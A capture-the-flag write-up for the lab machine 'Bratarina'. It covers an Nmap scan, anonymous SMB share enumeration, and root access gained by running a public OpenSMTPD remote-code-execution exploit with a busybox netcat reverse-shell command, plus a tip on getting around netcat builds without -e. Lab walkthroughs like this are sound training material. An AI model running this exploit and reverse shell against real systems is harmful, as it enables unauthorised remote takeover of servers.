---
icon: ubuntu
---

# Bratarina - Easy

## Gaining Access

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.126.71 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-20 16:35 EDT
Nmap scan report for 192.168.126.71
Host is up (0.026s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT    STATE  SERVICE     VERSION
22/tcp  open   ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:dd:2c:ea:2f:85:c5:89:bc:fc:e9:a3:38:f0:d7:50 (RSA)
|   256 e3:b7:65:c2:a7:8e:45:29:bb:62:ec:30:1a:eb:ed:6d (ECDSA)
|_  256 d5:5b:79:5b:ce:48:d8:57:46:db:59:4f:cd:45:5d:ef (ED25519)
25/tcp  open   smtp        OpenSMTPD
| smtp-commands: bratarina Hello nmap.scanme.org [192.168.45.158], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
53/tcp  closed domain
80/tcp  open   http        nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title:         Page not found - FlaskBB        
445/tcp open   netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)
Aggressive OS guesses: Linux 5.0 - 5.14 (98%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (98%), Linux 4.15 - 5.19 (94%), Linux 2.6.32 - 3.13 (93%), Linux 5.0 (92%), OpenWrt 22.03 (Linux 5.10) (92%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (90%), Linux 4.15 (90%), Linux 2.6.32 - 3.10 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: bratarina; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: bratarina
|   NetBIOS computer name: BRATARINA\x00
|   Domain name: \x00
|   FQDN: bratarina
|_  System time: 2025-09-20T16:38:01-04:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h20m02s, deviation: 2h18m34s, median: 2s
| smb2-time: 
|   date: 2025-09-20T20:38:04
|_  start_date: N/A

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   25.80 ms 192.168.45.1
2   25.77 ms 192.168.45.254
3   26.30 ms 192.168.251.1
4   26.32 ms 192.168.126.71
```

### SMB Guest Login

```
netexec smb 192.168.126.71 -u '' -p '' --shares
```

<figure><img src="../../.gitbook/assets/image (1980).png" alt=""><figcaption></figcaption></figure>

I am going to check out the backups share

```
smbclient -N \\\\192.168.126.71\\backups
```

<figure><img src="../../.gitbook/assets/image (1981).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1982).png" alt=""><figcaption></figcaption></figure>

Brute forcing SMTPD and SSH had led me nowhere and the application on port 80 has a 404 page&#x20;

<figure><img src="../../.gitbook/assets/image (1983).png" alt=""><figcaption></figcaption></figure>

Going back and taking a close look OpenSMTPD is version 2.0.0. A quick search on exploit has yielded an RCE exploit for a much newer version. I am going to try it anyway it might work.

### OpenSMTPD RCE

<figure><img src="../../.gitbook/assets/image (1984).png" alt=""><figcaption></figcaption></figure>

```
searchsploit -m 47984
```

This exploit takes the target's ip and smtp port along with a command we want to send. I am going to send a reverse nc command to get a shell.

```
python3 47984.py 192.168.126.71 25 "busybox nc 192.168.45.158 80 -e /bin/bash"
```

<figure><img src="../../.gitbook/assets/image (1985).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1986).png" alt=""><figcaption></figcaption></figure>

This exploit works great and we got a shell as root!

Most modern or secure distros use a version of `nc` that **disables `-e`**, often for **security reasons**. So that is why we use busybox

&#x20;`busybox nc` works with `-e` because **BusyBox’s version of netcat supports it**.
